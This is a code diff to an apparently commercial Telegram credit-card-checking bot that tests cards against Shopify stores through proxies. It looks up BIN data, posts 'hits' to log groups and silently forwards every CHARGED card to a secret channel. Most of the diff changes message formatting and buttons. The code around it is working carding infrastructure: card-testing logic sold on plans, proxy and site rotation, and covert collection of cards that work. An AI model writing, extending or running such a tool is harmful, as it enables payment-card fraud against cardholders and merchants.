@@ -46,7 +46,7 @@ from io import BytesIO
 from typing import Optional
 
 import aiohttp
-from telegram import Update, InputFile
+from telegram import Update, InputFile, MessageEntity
 from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
 
 from config import (
@@ -69,9 +69,11 @@ EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log
 # ── Secret channel — auto-receives every CHARGED card silently ──────────────
 SECRET_CHANNEL_ID   = -1004499920555
 SECRET_CHANNEL_LINK = "https://t.me/+86iK7fXMWEY2MGRk"
-BTN_LABEL           = "⚡ Batmancardchk"   # button shown on all result cards
+# ── Result card buttons ─────────────────────────────────────────────────────
 BOT_USERNAME_LINK   = "https://t.me/batcardchk29_bot"
-BOT_BUY_LINK        = "https://t.me/batcardchk29_bot?start=buy"  # opens bot /buy
+BOT_PLANS_LINK      = "https://t.me/batcardchk29_bot?start=plans"  # deep-links → /plans
+MY_CHANNEL_LINK     = "https://t.me/Batcardchk"                    # main channel
+LOGS_CHANNEL_LINK   = "https://t.me/+BXmeotREVhllODFk"             # hits log channel
 
 SH_COOLDOWN    = 25
 SITE_RETRIES   = 40    # sites tried per card — matches msh.py MAX_RETRIES
@@ -1464,6 +1466,111 @@ def _te(eid: str, fb: str = "●") -> str:
     return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
 
 
+def _u16len(s: str) -> int:
+    """UTF-16 code-unit length — what Telegram uses for entity offsets."""
+    return len(s.encode("utf-16-le")) // 2
+
+
+def html_to_entities(html: str):
+    """
+    Convert sh.py-style HTML into (plain_text, entities).
+
+    This is the ONLY reliable way to send custom emoji stickers in PTB.
+    Sending <tg-emoji> via parse_mode="HTML" often falls back to the
+    plain-text fallback character; injecting MessageEntity objects directly
+    guarantees animated premium stickers display for ALL users.
+
+    Handles: <b>  <code>  <a href="...">  <tg-emoji emoji-id="...">
+    Decodes: &lt;  &gt;  &amp;  &quot;
+    Entities may overlap (e.g. bold + custom_emoji on the same glyph).
+    """
+    text     = ""
+    entities = []
+    stack    = []        # [{name, offset, url?}]
+    i        = 0
+    n        = len(html)
+
+    while i < n:
+        ch = html[i]
+
+        # ── HTML tag ────────────────────────────────────────────────────────
+        if ch == "<":
+            j   = html.index(">", i)
+            tag = html[i + 1 : j]
+
+            # Closing tag
+            if tag.startswith("/"):
+                tag_name = tag[1:].strip().lower()
+                for k in range(len(stack) - 1, -1, -1):
+                    if stack[k]["name"] == tag_name:
+                        entry  = stack.pop(k)
+                        start  = entry["offset"]
+                        end    = _u16len(text)
+                        length = end - start
+                        if length > 0:
+                            if tag_name == "b":
+                                entities.append(MessageEntity(
+                                    type="bold", offset=start, length=length))
+                            elif tag_name == "code":
+                                entities.append(MessageEntity(
+                                    type="code", offset=start, length=length))
+                            elif tag_name == "a":
+                                entities.append(MessageEntity(
+                                    type="text_link", offset=start,
+                                    length=length, url=entry.get("url", "")))
+                        break
+                i = j + 1
+
+            # <tg-emoji emoji-id="...">FALLBACK</tg-emoji>  — handled inline
+            elif tag.lower().startswith("tg-emoji"):
+                m = re.search(r'emoji-id="([^"]+)"', tag)
+                if m:
+                    emoji_id  = m.group(1)
+                    close_idx = html.index("</tg-emoji>", j + 1)
+                    fallback  = html[j + 1 : close_idx]
+                    offset    = _u16len(text)
+                    text     += fallback
+                    length    = _u16len(fallback)
+                    if length > 0:
+                        entities.append(MessageEntity(
+                            type="custom_emoji", offset=offset,
+                            length=length, custom_emoji_id=emoji_id))
+                    i = close_idx + len("</tg-emoji>")
+                else:
+                    i = j + 1
+
+            # Opening tag
+            else:
+                tag_name = tag.split()[0].lower() if tag else ""
+                entry    = {"name": tag_name, "offset": _u16len(text)}
+                if tag_name == "a":
+                    m = re.search(r'href=["\']([^"\']+)["\']', tag)
+                    if m:
+                        entry["url"] = m.group(1)
+                stack.append(entry)
+                i = j + 1
+
+        # ── HTML entity escapes ─────────────────────────────────────────────
+        elif ch == "&":
+            if   html[i:i+4] == "&lt;":  text += "<"; i += 4
+            elif html[i:i+4] == "&gt;":  text += ">"; i += 4
+            elif html[i:i+5] == "&amp;": text += "&"; i += 5
+            elif html[i:i+6] == "&quot;":text += '"'; i += 6
+            else:                        text += ch;  i += 1
+
+        # ── Plain text ──────────────────────────────────────────────────────
+        else:
+            text += ch
+            i    += 1
+
+    return text, entities if entities else None
+
+
+def _send_ents(html: str):
+    """Return (plain_text, entities_or_None) from an HTML string."""
+    return html_to_entities(html)
+
+
 def _plan_eid(plan: str) -> str:
     norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
     if norm in PLAN_EMOJIS:
@@ -1593,9 +1700,18 @@ async def _fetch_bin_direct(bin6: str) -> dict:
                     except Exception:
                         continue
                     info = src["parse"](data)
-                    if not info.get("scheme") and not info.get("bank"):
+                    # Require scheme AND at least one of bank/country to be non-empty.
+                    # A result with scheme but N/A bank + N/A country is useless — try next source.
+                    _bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
+                    scheme_ok  = bool((info.get("scheme")  or "").strip().upper() not in _bad)
+                    bank_ok    = bool((info.get("bank")    or "").strip().upper() not in _bad)
+                    country_ok = bool((info.get("country") or "").strip().upper() not in _bad)
+                    if not scheme_ok or not (bank_ok or country_ok):
                         continue
                     cc = (info.get("country_code") or "").upper()[:2]
+                    # Build flag from alpha2 if not provided by the source
+                    if not cc and info.get("country"):
+                        cc = ""
                     info["country_emoji"] = COUNTRY_FLAGS.get(cc, "")
                     return info
         except Exception:
@@ -1607,12 +1723,15 @@ def _bin_empty(r: dict) -> bool:
     """True if the result has no usable BIN data (N/A, error, or missing)."""
     if not r or r.get("error"):
         return True
-    bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None"}
+    bad = {"", "N/A", "NONE", "UNKNOWN", "NULL", "None", "none"}
     scheme  = str(r.get("scheme",  "") or "").strip().upper()
     bank    = str(r.get("bank",    "") or "").strip().upper()
     country = str(r.get("country", "") or "").strip().upper()
-    # Need at least scheme OR (bank + country) to be useful
-    return scheme in bad and (bank in bad or country in bad)
+    # Need scheme AND at least one of bank/country
+    scheme_ok  = scheme  not in bad
+    bank_ok    = bank    not in bad
+    country_ok = country not in bad
+    return not scheme_ok or not (bank_ok or country_ok)
 
 
 async def _bin_lookup(bin6: str) -> dict:
@@ -1787,9 +1906,10 @@ async def _update_progress(bot, sid: str, force: bool = False):
     if text == sess.get("last_text") and not force:
         return
     try:
+        _plain, _ents = html_to_entities(text)
         await bot.edit_message_text(
             chat_id=sess["chat_id"], message_id=sess["msg_id"],
-            text=text, parse_mode="HTML",
+            text=_plain, entities=_ents,
             reply_markup=_msh_buttons(sid, running),
             disable_web_page_preview=True,
         )
@@ -1859,8 +1979,9 @@ async def _send_hit(bot, user, text: str, verdict: str, card: str = "",
 
     # ── 1. DM the user who ran the check ────────────────────────────────────
     try:
-        await bot.send_message(chat_id=user.id, text=text,
-                               parse_mode="HTML", disable_web_page_preview=True)
+        _dm_plain, _dm_ents = html_to_entities(text)
+        await bot.send_message(chat_id=user.id, text=_dm_plain,
+                               entities=_dm_ents, disable_web_page_preview=True)
     except Exception as e:
         logging.warning(f"[HIT] DM uid={user.id}: {e}")
 
@@ -1892,10 +2013,12 @@ async def _send_hit(bot, user, text: str, verdict: str, card: str = "",
                 f'<b>{_te(USER_EMOJI_ID,"👤")} User ➛ {ulink} {_te(peid,"⭐")}</b>'
             )
             grp_kb = RawMarkup([[
-                _btn(f"⚡ {BOT_NAME}", url=BOT_BUY_LINK, style="primary"),
+                _btn("🤖 Open Bot", url=BOT_PLANS_LINK,   style="primary"),
+                _btn("📢 Channel",  url=MY_CHANNEL_LINK,  style="primary"),
             ]])
-            await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=grp,
-                                   parse_mode="HTML", disable_web_page_preview=True,
+            _grp_plain, _grp_ents = html_to_entities(grp)
+            await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=_grp_plain,
+                                   entities=_grp_ents, disable_web_page_preview=True,
                                    reply_markup=grp_kb)
         except Exception as e:
             logging.warning(f"[HIT] log group: {e}")
@@ -1916,10 +2039,12 @@ async def _send_hit(bot, user, text: str, verdict: str, card: str = "",
                 f'<b>{_te(USER_EMOJI_ID,"👤")} User ➛ {ulink_x} {_te(peid_x,"⭐")}</b>'
             )
             ext_kb = RawMarkup([[
-                _btn(f"⚡ {BOT_NAME}", url=BOT_BUY_LINK, style="primary"),
+                _btn("🤖 Open Bot", url=BOT_PLANS_LINK,   style="primary"),
+                _btn("📢 Channel",  url=MY_CHANNEL_LINK,  style="primary"),
             ]])
-            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=ext_grp,
-                                   parse_mode="HTML", disable_web_page_preview=True,
+            _ext_plain, _ext_ents = html_to_entities(ext_grp)
+            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=_ext_plain,
+                                   entities=_ext_ents, disable_web_page_preview=True,
                                    reply_markup=ext_kb)
         except Exception as e:
             logging.warning(f"[HIT] extra group: {e}")
@@ -2212,11 +2337,10 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ud["credits"]   = max(0, ud.get("credits", 1) - 1)
 
     plan = ud.get("plan", "TRIAL")
-    spin = await update.message.reply_text(
-        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
-        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking...</b>',
-        parse_mode="HTML",
-    )
+    _sp_html  = (f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
+                 f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking...</b>')
+    _sp_plain, _sp_ents = html_to_entities(_sp_html)
+    spin = await update.message.reply_text(_sp_plain, entities=_sp_ents)
 
     proxies = _load_proxies()
 
@@ -2231,11 +2355,10 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # If probe has never run and all sites look dead, warn user briefly
     if not _WORKING_SITES:
-        await spin.edit_text(
-            f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
-            f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Finding live sites... please wait</b>',
-            parse_mode="HTML",
-        )
+        _wt_html  = (f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
+                     f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Finding live sites... please wait</b>')
+        _wt_plain, _wt_ents = html_to_entities(_wt_html)
+        await spin.edit_text(_wt_plain, entities=_wt_ents)
         # Block until probe finishes (only for single check, to get real result)
         sites = await probe_all_sites(_load_sites(), proxies)
 
@@ -2254,14 +2377,18 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text    = build_result_msg(card, resp, verdict, bin_data,
                                price, currency, elapsed, user, plan)
 
-    # Always show bot name button → opens /buy in bot
-    kb = RawMarkup([[_btn(BTN_LABEL, url=BOT_BUY_LINK, style="primary")]])
+    # Two buttons on every result card: main channel + logs channel
+    kb = RawMarkup([[
+        _btn(f"📢 {BOT_NAME}",  url=MY_CHANNEL_LINK,  style="primary"),
+        _btn("📋 Hit Logs",     url=LOGS_CHANNEL_LINK, style="primary"),
+    ]])
 
+    _res_plain, _res_ents = html_to_entities(text)
     try:
-        await spin.edit_text(text, parse_mode="HTML",
+        await spin.edit_text(_res_plain, entities=_res_ents,
                              disable_web_page_preview=True, reply_markup=kb)
     except Exception:
-        await update.message.reply_text(text, parse_mode="HTML",
+        await update.message.reply_text(_res_plain, entities=_res_ents,
                                         disable_web_page_preview=True, reply_markup=kb)
 
     if verdict in ("CHARGED", "LIVE", "TDS"):
